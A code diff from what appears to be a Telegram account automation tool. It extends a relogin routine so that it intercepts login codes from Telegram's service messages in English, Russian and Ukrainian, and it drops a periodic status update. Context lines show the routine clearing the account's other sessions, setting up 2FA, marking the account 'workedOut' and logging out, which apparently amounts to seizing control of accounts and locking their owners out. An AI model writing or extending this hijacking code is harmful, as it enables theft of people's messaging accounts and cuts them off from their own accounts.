@@ -5,7 +5,6 @@ import { sleep } from '../helpers/helpers';
 import { sendToMainBot } from '../helpers/sendToMainBot';
 import { clearAuthorizations } from '../methods/account/clearAuthorizations';
 import { setup2FA } from '../methods/account/setup2FA';
-import { updateStatus } from '../methods/account/updateStatus';
 import { handleUpdate } from '../methods/update/handleUpdate';
 import { getMe } from '../methods/users/getMe';
 import { initClient } from '../modules/client';
@@ -32,9 +31,13 @@ export const relogin = async (ID: string) => {
       (update.className === 'UpdateShortMessage' ||
         update.className === 'UpdateNewMessage') &&
       String(update.userId) === '777000' &&
-      update.message?.includes('Login code:')
+      (update.message?.includes('Login code:') ||
+        update.message?.includes('Код для входа в Telegram:') ||
+        update.message?.includes('Код для входу'))
     ) {
-      const code = update.message.match(/Login code: (\d+)/)?.[1];
+      const code = update.message.match(
+        /(?:Login code: |Код для входа в Telegram: |Код для входу[^:]*: )(\d+)/
+      )?.[1];
       if (code) {
         codePromise.resolve(code);
       }
@@ -65,23 +68,7 @@ export const relogin = async (ID: string) => {
       (error) => sendToMainBot(error)
     );
 
-    const interval = setInterval(async () => {
-      try {
-        if (
-          !client._sender._user_connected ||
-          client._sender.isReconnecting ||
-          client._sender.userDisconnected
-        ) {
-          return;
-        }
-
-        await updateStatus(client, false);
-      } catch {}
-    }, 10000);
-
-    await updateStatus(client, false);
     await clearAuthorizations(client);
-
     const twoFa = await setup2FA(client, account);
     if (twoFa) {
       console.error({
@@ -191,8 +178,6 @@ export const relogin = async (ID: string) => {
 
     await updateAccountById(id, data);
     await updateAccountById(ID, { workedOut: true });
-
-    clearInterval(interval);
     await invokeRequest(client, new GramJs.auth.LogOut());
 
     await sleep(2000);
